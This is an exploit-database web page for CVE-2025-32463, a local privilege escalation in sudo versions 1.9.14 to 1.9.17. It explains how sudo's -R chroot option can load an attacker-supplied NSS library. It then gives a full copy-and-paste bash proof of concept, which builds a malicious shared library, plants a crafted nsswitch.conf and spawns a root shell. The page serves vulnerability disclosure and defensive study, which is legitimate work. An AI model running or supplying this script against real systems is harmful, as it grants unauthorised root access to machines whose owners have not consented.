---
title: Sudo chroot 1.9.17 Local Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2025070037
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-07-29
fetch_date: 2025-10-06T23:16:34.653154
---

# Sudo chroot 1.9.17 Local Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Sudo chroot 1.9.17 Local Privilege Escalation** **2025.07.28**  Credit:  **[Stratascale](https://cxsecurity.com/author/Stratascale/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-32463](https://cxsecurity.com/cveshow/CVE-2025-32463/ "Click to see CVE-2025-32463")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")**  **[**Dork:** not aplicable](https://cxsecurity.com/dorks/)** | |

Exploit Title: Sudo chroot 1.9.17 - Local Privilege Escalation
Google Dork: not aplicable
Date: Mon, 30 Jun 2025
Exploit Author: Stratascale
Vendor Homepage:https://salsa.debian.org/sudo-team/sudo
Software Link:
Version: Sudo versions 1.9.14 to 1.9.17 inclusive
Tested on: Kali Rolling 2025-7-3
CVE : CVE-2025-32463
\*Version running today in Kali:\*
https://pkg.kali.org/news/640802/sudo-1916p2-2-imported-into-kali-rolling/
\*Background\*
An attacker can leverage sudo's -R (--chroot) option to run
arbitrary commands as root, even if they are not listed in the
sudoers file.
Sudo versions affected:
Sudo versions 1.9.14 to 1.9.17 inclusive are affected.
CVE ID:
This vulnerability has been assigned CVE-2025-32463 in the
Common Vulnerabilities and Exposures database.
Details:
Sudo's -R (--chroot) option is intended to allow the user to
run a command with a user-selected root directory if the sudoers
file allows it. A change was made in sudo 1.9.14 to resolve
paths via chroot() using the user-specified root directory while
the sudoers file was still being evaluated. It is possible for
an attacker to trick sudo into loading an arbitrary shared
library by creating an /etc/nsswitch.conf file under the
user-specified root directory.
The change from sudo 1.9.14 has been reverted in sudo 1.9.17p1
and the chroot feature has been marked as deprecated. It will
be removed entirely in a future sudo release. Because of the
way sudo resolves commands, supporting a user-specified chroot
directory is error-prone and this feature does not appear to
be widely used.
A more detailed description of the bug and its effects can be
found in the Stratascale advisory:
https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot
Impact:
On systems that support /etc/nsswitch.conf a user may be able
to run arbitrary commands as root.
\*Exploit:\*
\*Verify the sudo version running: sudo --versionIf is vulnerable, copy and
paste the following code and run it.\*
\*----------------------\*
#!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"
# 1. NSS library
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
\_\_attribute\_\_((constructor))
void woot(void) {
setreuid(0,0); /\* change to UID 0 \*/
setregid(0,0); /\* change to GID 0 \*/
chdir("/"); /\* exit from chroot \*/
execl("/bin/bash","/bin/bash",NULL); /\* root shell \*/
}
EOF
# 2. Mini chroot with toxic nsswitch.conf
mkdir -p woot/etc libnss\_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc # make getgrnam() not fail
# 3. compile libnss\_
gcc -shared -fPIC -Wl,-init,woot -o libnss\_/woot1337.so.2 woot1337.c
echo "[\*] Running exploit…"
sudo -R woot woot # (-R <dir> <cmd>)
# • the first “woot” is chroot
# • the second “woot” is and inexistent
command
# (only needs resolve the user)
rm -rf "$STAGE"
\*----------------------\*

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025070037)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top